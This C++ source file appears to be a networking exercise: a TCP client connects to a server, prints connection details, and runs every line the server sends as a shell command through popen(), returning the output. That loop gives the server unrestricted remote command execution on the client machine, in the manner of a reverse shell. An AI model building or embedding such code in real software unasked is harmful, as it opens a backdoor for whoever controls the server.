#include "methods.h"

#define MAXLINE 4096

using namespace std;

// initialize the clients socket
int init_socket(char *ip, int port)
{
    struct sockaddr_in servaddr;

    int sockfd = SocketUtils::Socket(AF_INET, SOCK_STREAM, 0);

    bzero(&servaddr, sizeof(servaddr));
    servaddr.sin_family = AF_INET;   // use IPv4
    servaddr.sin_port = htons(port); // server port

    SocketUtils::Inet_pton(AF_INET, ip, &servaddr.sin_addr);

    SocketUtils::Connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr));

    return sockfd;
}

void print_local_connection_info(int fd)
{
    struct sockaddr_in addr;
    socklen_t len = sizeof(addr);
    char address_name[128];

    SocketUtils::Getsockname(fd, (struct sockaddr *)&addr, &len);
    SocketUtils::Inet_ntop(AF_INET, &(addr.sin_addr), address_name, sizeof(address_name));

    cout << endl
         << "*****************************" << endl;
    cout << "*** Local connection info ***" << endl;
    cout << "*****************************" << endl;
    cout << "* Local address = " << address_name << " *" << endl;
    cout << "* Local port number = " << ntohs(addr.sin_port) << " *" << endl;
    cout << "*****************************" << endl
         << endl;
}

void print_server_connection_info(int fd)
{
    struct sockaddr_in addr;
    socklen_t len = sizeof(addr);
    char address_name[128];

    SocketUtils::Getpeername(fd, (struct sockaddr *)&addr, &len);
    SocketUtils::Inet_ntop(AF_INET, &(addr.sin_addr), address_name, sizeof(address_name));

    cout << endl
         << "******************************" << endl;
    cout << "*** Server connection info ***" << endl;
    cout << "******************************" << endl;
    cout << "* Server address = " << address_name << " *" << endl;
    cout << "* Server port number = " << ntohs(addr.sin_port) << " *" << endl;
    cout << "******************************" << endl
         << endl;
}

string exec_command(const char *cmd)
{
    array<char, 128> buffer;
    string result;
    unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
    if (!pipe)
    {
        throw runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr)
    {
        result += buffer.data();
    }
    return result;
}

bool check_exit_command()
{
    string input;

    while (true)
    {
        getline(cin, input);
        if (input == "exit")
        {
            return true;
        }
    }

    return false;
}

void start_cli(int fd)
{
    string input;
    char received_line[MAXLINE];
    chrono::seconds timeout(1);
    future<bool> should_exit_future = async(check_exit_command);

    while (true)
    {
        if (should_exit_future.wait_for(timeout) == future_status::ready && should_exit_future.get())
        {
            string exit_command = "exit";
            SocketUtils::Writen(fd, exit_command.c_str(), exit_command.length());
            break;
        }

        if (SocketUtils::Readall(fd, received_line, MAXLINE) == 0)
        {
            close(fd);
            exit(0);
        }

        string result = exec_command(received_line);

        SocketUtils::Writen(fd, result.c_str(), result.length());

        string received_str = string(received_line);
        cout << "Received from server (reversed): " << string(received_str.rbegin(), received_str.rend()) << endl
             << endl
             << endl
             << endl;
    }

    close(fd);
    exit(0);
}